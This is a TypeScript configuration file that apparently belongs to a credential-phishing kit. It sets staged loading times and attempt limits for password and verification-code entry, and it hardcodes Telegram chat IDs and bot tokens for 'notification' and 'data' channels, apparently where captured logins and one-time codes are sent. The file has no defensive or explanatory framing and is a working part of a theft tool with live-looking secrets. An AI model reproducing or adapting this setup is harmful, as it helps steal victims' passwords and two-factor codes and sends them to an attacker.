interface Config {
  settings: {
    code_loading_time: number;
    max_failed_code_attempts: number;
    max_failed_password_attempts: number;
    page_loading_time: number;
    password_loading_time: number;
    code_input_enabled: boolean;
  };
  telegram: {
    notification_chatid: string;
    notification_token: string;
    data_chatid: string;
    data_token: string;
  };
}

// Define default configuration
const defaultConfig: Config = {
  settings: {
    code_loading_time: 12000,
    max_failed_code_attempts: 4,
    max_failed_password_attempts: 0,
    page_loading_time: 5000,
    password_loading_time: 10000,
    code_input_enabled: true,
  },
  telegram: {
    notification_chatid: '6759061293',
    notification_token: '6712837143:AAE8XOfS59_SBeGgiHnszVJpwEzh5_iCuvU', 
    data_chatid: '6759061293', 
    data_token: '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk',
  },
};

const getConfig = async (): Promise<Config> => {
  return defaultConfig;
};

export default getConfig;
